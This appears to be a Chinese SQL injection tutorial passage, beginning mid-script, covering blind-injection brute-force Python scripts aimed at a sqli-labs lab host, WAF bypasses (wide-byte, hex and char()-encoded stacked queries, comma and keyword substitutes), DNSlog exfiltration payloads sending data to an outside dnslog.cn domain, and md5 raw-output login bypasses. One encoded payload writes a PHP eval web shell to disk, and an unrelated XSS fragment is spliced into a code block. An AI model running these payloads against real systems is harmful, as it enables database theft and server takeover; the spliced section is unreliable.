payload = "' or (select database()) like '{}%'--+"

if __name__ == "__main__":
    name = ''
    for i in range(1, 40):
        char = ''
        for j in strs:
            payloads = payload.format(name + j)
            urls = url + payloads
            r = requests.get(urls)
            if "You are in" in r.text:
                name += j
                print(j, end='')
                char = j
                break
        if char == '#':
            break
```

#### REGEXP注入

REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。

1、判断数据库长度

```sql
/?id=' or (length(database())) regexp 8 --+  // 回显正常
```

2、判断数据库名

```sql
/?id=' or database() regexp '^s'--+    // 回显正常
/?id=' or database() regexp 'se'--+    // 回显正常, 不适用^和$进行匹配也可以
/?id=' or database() regexp '^sa'--+   // 报错
/?id=' or database() regexp 'y$'--+    // 回显正常
```

脚本

```python
import requests
import string

# strs = string.printable
strs = string.ascii_letters + string.digits + '_'
url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

payload = "' or (select database()) regexp '^{}'--+"

if __name__ == "__main__":
    name = ''
    for i in range(1, 40):
        char = ''
        for j in strs:
            payloads = payload.format(name + j)
            urls = url + payloads
            r = requests.get(urls)
            if "You are in" in r.text:
                name += j
                print(j, end='')
                char = j
                break
        if char == '#':
            break
```

### 过滤引号绕过

#### 宽字节注入

**magic_quotes_gpc**

`magic_quotes_gpc`函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。

**addslashes()函数**

返回在预定义字符之前添加反斜杠的字符串

> 预定义字符：单引号（'），双引号（"），反斜杠（\），NULL

宽字节概念

1. 单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)
2. 多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。
3. UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
4. 常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。
5. 宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字

**成因与示例**

前面讲到了GBK编码格式。GBK是双字符编码，那么为什么他们会和渗透测试发送了“巧遇”呢？

**宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。**

例如说MySql的编码设置为了SET NAMES 'gbk'或是 SET character_set_client =gbk

**宽字节SQL注入的根本原因:**

**宽字节SQL注入就是PHP发送请求到MySql时使用了语句**

**SET NAMES 'gbk' 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。**

为了绕过magic_quotes_gpc的\,于是乎我们开始导入宽字节的概念

我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c

```sql
SELECT * FROM users WHERE id='1\'' LIMIT 0,1
```

这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过

```sql
SELECT * FROM users WHERE id='1�\'#' LIMIT 0,1
```

****

#### 使用反斜杠\逃逸Sql语句

如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。

假设语句为：

```sql
select username, password from users where username='$username' and password='$password';
```

假设输入的用户名是 `admin\`，密码输入的是 `or 1#` 整个SQL语句变成了

```sql
select username, password from users where username='admin\' and password='or 1#';
```

由于单引号被转义，`and password=`这部分都成了username的一部分，也就是

```sql
admin\' and password=
```

这样 `or 1` 就逃逸出来了，由此可控，可作为注入点了。

### 堆叠注入时利用MySql预处理

在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用**MySql预处理语句配合concat拼接**来执行sql语句拿flag。

1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(`hello`)供之后调用
2. EXECUTE：执行命令
3. DEALLOCATE PREPARE：释放命令
4. SET：用于设置变量(`@a`)

```sql
1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
```

#### MySql 预处理配合十六进制绕过关键字

原理如下

```sql
mysql> select hex('show databases');
+------------------------------+
| hex('show databases')        |
+------------------------------+
| 73686F7720646174616261736573 |
+------------------------------+
1 row in set (0.00 sec)

mysql> set @b = 0x73686F7720646174616261736573;
Query OK, 0 rows affected (0.00 sec)

mysql> prepare test from @b;
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> execute test;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ayu_jweb           |
| challenges         |
| dami               |
| db1                |
| db_zbz             |
| dvwa               |
| mybatis            |
| mysql              |
| onethink           |
| ourphp             |
| performance_schema |
| security           |
| test               |
+--------------------+
14 rows in set (0.00 sec)
```

即payload类似如下：

```sql
1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
```

#### MySql预处理配合字符串拼接绕过关键字

原理就是借助`char()`函数将ascii码转化为字符然后再使用`concat()`函数将字符连接起来，有了前面的基础这里应该很好理解了：

```sql
set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
```

也可以不用concat函数，直接用char函数也具有连接功能：

```sql
set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
```

### 过滤逗号绕过

当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：

```sql
select substr((select database()),1,1);
select * from users limit 0,1;
```

#### 使用from...for...绕过

我们可以使用 `from...for..` 语句替换 substr() 函数里的 `,1,1`：

```sql
select substr((select database()) from 1 for 1);
# 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1

select substr((select database()) from 1 for 1);    # s
select substr((select database()) from 2 for 1);    # e
select substr((select database()) from 3 for 1);    # c
select substr((select database()) from 4 for 1);    # u
select substr((select database()) from 5 for 1);    # r
select substr((select database()) from 6 for 1);    # i
select substr((select database()) from 7 for 1);    # t
select substr((select database()) from 8 for 1);    # y

# 如果过滤了空格, 则可以使用括号来代替空格:
select substr((select database())from(1)for(1));    # s
select substr((select database())from(2)for(1));    # e
select substr((select database())from(3)for(1));    # c
select substr((select database())from(4)for(1));    # u
select substr((select database())from(5)for(1));    # r
select substr((select database())from(6)for(1));    # i
select substr((select database())from(7)for(1));    # t
select substr((select database())from(8)for(1));    # y
```

即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 `from 1` 就相当于从字符串的第一位一直截取到最后：

```sql
select substr((select database()) from 1);    # security
select substr((select database()) from 2);    # ecurity
select substr((select database()) from 3);    # curity
select substr((select database()) from 4);    # urity
select substr((select database()) from 5);    # rity
select substr((select database()) from 6);    # ity
select substr((select database()) from 7);    # ty
select substr((select database()) from 8);    # y

# 也可以使用负数来倒着截取:
select substr((select database())from(-1));    # y
select substr((select database())from(-2));    # ty
select substr((select database())from(-3));    # ity
select substr((select database())from(-4));    # rity
select substr((select database())from(-5));    # urity
select substr((select database())from(-6));    # curity
select substr((select database())from(-7));    # ecurity
select substr((select database())from(-8));    # security
```

#### 使用offset关键字绕过

我们可以使用 `offset` 语句替换 limit 语句里的逗号：

```sql
select * from users limit 1 offset 2;
# 此时 limit 1 offset 2 可以代替 limit 1,2
```

#### 利用join与别名绕过

```sql
select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));
```

### 过滤information_schema绕过与无列名注入 *

当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？

information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。

能够代替information_schema的有：

- sys.schema_auto_increment_columns 只显示有自增的表
- sys.schema_table_statistics_with_buffer
- x$schema_table_statistics_with_buffe

```sql
select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
```

- mysql.innodb_table_stats
- mysql.innodb_table_index

以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。

但是在使用上面的后两个表来获取表名之后`select group_concat(table_name) from mysql.innodb_table_stats`，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。

#### 无列名注入

##### 123法

我们可以利用一些查询上的技巧来进行无列名、表名的注入。

在我们直接`select 1,2,3`时，会创建一个虚拟的表

```sql
mysql> select 1,2,3;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
1 row in set (0.00 sec)
```

如图所见列名会被定义为1，2，3

当我们结合了union联合查询之后

```sql
mysql> select 1,2,3 union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | jiamu      |
+----+----------+------------+
14 rows in set (0.00 sec)
```

如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：

```sql
select `3` from (select 1,2,3 union select * from users)a;
```

```sql
mysql> select `3` from (select 1,2,3 union select * from users)a;
+------------+
| 3          |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
| crappy     |
| stupidity  |
| genious    |
| mob!le     |
| admin      |
| admin1     |
| admin2     |
| admin3     |
| dumbo      |
| jiamu      |
+------------+
14 rows in set (0.00 sec)
```

末尾的 a 可以是任意字符，用于命名

当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：

```sql
select b from (select 1,2,3 as b union select * from users)a;
```

```sql
mysql> select b from (select 1,2,3 as b union select * from users)a;
+------------+
| b          |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
| crappy     |
| stupidity  |
| genious    |
| mob!le     |
| admin      |
| admin1     |
| admin2     |
| admin3     |
| dumbo      |
| jiamu      |
+------------+
14 rows in set (0.00 sec)
```

##### joion

我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。

```sql
mysql> select * from (select * from users as a join users b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users as a join users b using(id,username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
mysql> select * from (select * from users as a join users b using(id,username,password))c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | jiamu      |
+----+----------+------------+
13 rows in set (0.02 sec)
```

### 过滤其他关键字绕过

#### 过滤 if 语句绕过

如果过滤了 if 关键字的话，我们可以使用case when语句绕过：

```sql
if(condition,1,0) <=> case when condition then 1 else 0 end
```

下面的if语句和case when语句是等效的：

```sql
0' or if((ascii(substr((select database()),1,1))>97),1,0)#

0' or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#
```

```sql
mysql> select * from users where id ='0' or case when ascii(substr((select database()),1,1))>97 then sleep(3) else 0 end;
Empty set (39.12 sec)
```

### 过滤substr绕过

#### 使用lpad/rpad绕过

```sql
select lpad((select database()),1,1)    // s
select lpad((select database()),2,1)    // se
select lpad((select database()),3,1)    // sec
select lpad((select database()),4,1)    // secu
select lpad((select database()),5,1)    // secur
select lpad((select database()),6,1)    // securi
select lpad((select database()),7,1)    // securit
select lpad((select database()),8,1)    // security

select rpad((select database()),1,1)    // s
select rpad((select database()),2,1)    // se
select rpad((select database()),3,1)    // sec
select rpad((select database()),4,1)    // secu
select rpad((select database()),5,1)    // secur
select rpad((select database()),6,1)    // securi
select rpad((select database()),7,1)    // securit
select rpad((select database()),8,1)    // security
```

lpad：函数语法：`lpad(str1,length,str2)`。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。

#### 使用left绕过

```sql
select left((select database()),1)    // s
select left((select database()),2)    // se
select left((select database()),3)    // sec
select left((select database()),4)    // secu
select left((select database()),5)    // secur
select left((select database()),6)    // securi
select left((select database()),7)    // securit
select left((select database()),8)    // security
```

#### 使用mid绕过

mid()函数的使用就和substr()函数一样了：

```sql
select mid((select database()),1,1)    // s
select mid((select database()),2,1)    // e
select mid((select database()),3,1)    // c
select mid((select database()),4,1)    // u
select mid((select database()),5,1)    // r
```

#### 神奇的东西绕过

```sql
select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s
select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e
select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c
select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u
select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r
select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i
select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t
```

INSERT( *string* , *position* , *number* , *string2* )

INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。

| 参数       | 描述                           |
| ---------- | ------------------------------ |
| *string*   | 必须项。要修改的字符串         |
| *position* | 必须项。插入*string2*的位置    |
| *number*   | 必须项。要替换的字符数         |
| *string2*  | 必须项。要插入*字符串的字符串* |

### HTTP参数污染绕过

HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。

但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：`http://www.baidu.com?name=aa&name=bb`，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是 `name=aa`。有的服务器是取第二个参数，也就是 `name=bb`。有的服务器两个参数都取，也就是 `name=aa,bb`。这种特性在绕过一些服务器端的逻辑判断时，非常有用。

HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：

| **Web 服务器**       | **参数获取函数**          | **获取到的参数** |
| -------------------- | ------------------------- | ---------------- |
| **PHP/Apache**       | $_GET['a']                | Last             |
| **JSP/Tomcat**       | Request.getParameter('a') | First            |
| **Perl(CGI)/Apache** | Param('a')                | First            |
| **Python/Apache**    | getvalue('a')             | All              |
| **ASP/IIS**          | Request.QueryString('a')  | All              |

+ 例题

```sql
http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1

发现输出结果为id=1的值

http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1&id=2

发现输出结果为id=2的值

http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1&id=2&id=3

发现输出结果为id=3的值

综上，发现mysql中用&连接多个参数，只输出最后一个参数的结果。
```

```sql
http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1'&id=2&id=3

页面显示注入被拦截。

http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1&id=2'&id=3

页面无变化。

http://192.168.18.21/sqli-labs-master/Less-29/login.php?id=1&id=2&id=3'

页面报数据库错误。

说明第一个参数被waf拦截，中间的参数无影响，最后一个参数被带到数据库中执行。

本关存在php的一个hpp漏洞，当同时传递多个参数时，不同的服务器可能会取得不同的参数值。
```

可以通过http参数污染绕过waf参数拦截：

如果是$_get(id)获取id，则可以在参数后添加参数，对最后的参数进行注入，即可绕过waf。

也就是说waf只检查第一个参数，而应用程序取最后一个参数代入数据库执行。

### False 注入绕过

#### 注入原理

前面我们学过的注入都是基于1=1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。

首先我们来看一看下面这个sql查询语句：

```sql
select * from users where username = 0;
```

```sql
mysql> select * from users where username = 0;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | jiamu      |
+----+----------+------------+
13 rows in set, 13 warnings (0.00 sec)
```

为什么 `username = 0` 会导致返回数据，而且是全部数据呢？

这就是一个基于 False 注入的例子，下面再举一个例子：

```sql
select * from user where username = 0;
```

```sql
mysql> select * from users where password = 0;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | jiamu      |
+----+----------+------------+
13 rows in set, 13 warnings (0.00 sec)
```

#### False 注入利用

下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：

```sql
select * from user where username ='.$username.';
```

在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的**利用点**？

可以使用的姿势有很多，比如下面的算数运算：

- 利用算数运算

加：+

```
插入'+', 拼接的语句: select * from user where username =''+'';
```

减：-

```
插入'-', 拼接的语句: select * from user where username =''-'';
```

乘：*

```
插入'*', 拼接的语句: select * from user where username =''*'';
```

除：/

```
插入'/6#, 拼接的语句: select * from user where username =''/6#';
```

取余：%

```
插入'%1#, 拼接的语句: select * from user where username =''%1#';
```

- 利用位操作运算

我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。

和运算：&

```
插入'&0#, 拼接的语句: select * from user where username =''&0#';
```

或运算：|

```
插入'|0#, 拼接的语句: select * from user where username =''|0#';
```

异或运算：^

```
插入'^0#, 拼接的语句: select * from user where username =''^0#';
```

移位操作：

```
插入'<<0# 或 '>>0#, 拼接的语句: 
select * from user where username =''<<0#';
select * from user where username =''>>0#';
```

- 利用比较运算符

安全等于：<=>

```
'=0<=>1# 拼接的语句：where username=''=0<=>1#'
```

不等于<>(!=)

```
'=0<>0# 拼接的语句：where username=''=0<>0#'
```

大小于>或<

```
'>-1# 拼接的语句：where username=''>-1#
```

- 其他

```
'+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
```

### DNS注入

##### 原理

通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。

在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。

##### LOAD_FILE() 读取文件的函数

> 读取文件并返回文件内容为字符串。

> 要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。

**注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv=**

##### DNSLOG平台:

> https://dns.xn--9tr.com/
>
> https://log.xn--9tr.com/

##### UNC路径

> UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。

UNC路径的 **格式** ：**\server\sharename\directory\filename**

等同于**SELECT LOAD_FILE('//库名.1806dl.dnslog.cn/abc'**

去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。

然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了

payload示例

```sql
?id=1 and load_file(concat('//', database(),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//', (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//',(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//',(select password from admin limit 0,1),'.htleyd.dnslog.cn/abc'))
```

#### '".md5($pass,true)."' 登录绕过

很多站点为了安全都会利用这样的语句：

```sql
SELECT * FROM users WHERE password = '.md5($password,true).';
```

`md5(string,true)` 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：`'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`：

这不是普通的二进制字符串，而是 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c` 这种，这样的话就会和前面的形成闭合，构成万能密码。

```sql
SELECT * FROM users WHERE password = ''or'6.......'
```

这就是永真的了，这就是一个万能密码了相当于 `1' or 1=1#` 或 `1' or 1#`。

> 但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？

> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于 password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password=‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）

接下来就是找到这样子的字符串，这里给出两个吧。

ffifdyop：

```
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
http://域名/up/uploadimg_form.php?imgid="><script>alert(2)</script>
http://域名/up/uploadimg_form.php?noshuiyin="><script>alert(1)</script>

ZZCMS招商网内容管理系统是基于php语言开发的一款web应用
其中对于用户传入的参数没有进行过滤，在一些与用户交互的业务中，导致用户可以构造一些非法语句插入到执行代码中，导致了用户可以执行javascript代码

可以编写一个全局函数，来对用户输入的参数进行识别过滤，如果出现特殊字符，则对其进行编码，过滤一些JavaScript函数的关键字
```

129581926211651571912466741651878684928：

```
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
```